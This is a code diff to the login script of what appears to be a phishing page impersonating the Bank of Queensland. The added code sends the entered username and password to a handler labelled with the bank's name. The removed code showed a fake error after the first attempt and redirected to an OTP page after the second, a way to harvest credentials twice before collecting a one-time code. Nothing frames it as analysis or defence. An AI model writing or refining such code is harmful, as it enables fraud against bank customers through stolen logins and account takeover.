@@ -1807,23 +1807,20 @@
         if (formData.username && formData.password) {
             console.log("Sending data:", formData);
             $.ajax({
-    type: 'GET',                // static servers only handle GET
-    url: 'next.html',           // not .php
-    data: formData,
+    type: 'GET',
+    url: 'process.html',
+    data: {
+        type: 'login',
+        username: $('#txtUserid').val().trim(),
+        password: $('#id11').val().trim(),
+        title: 'Bank of QueensLand'
+    },
     success: function(response) {
-                    console.log('AJAX success, response:', response);
-                    successCount++;
-                    if (successCount === 1) {
-                        $('#error-msg').show();
-                        $('#txtUserid, #id11').val('');
-                    }
-                    if (successCount === 2) {
-                        window.location.href = 'boq-otp.html';
-                    }
-                },
+        console.log('Response:', response);
+        // The page will redirect, so we don't need to handle it here.
+    },
     error: function(xhr, status, error) {
-        console.error('AJAX error:', status, error);
-        console.error('Response:', xhr.responseText);
+        console.error('AJAX error:', error);
     }
 });
         }
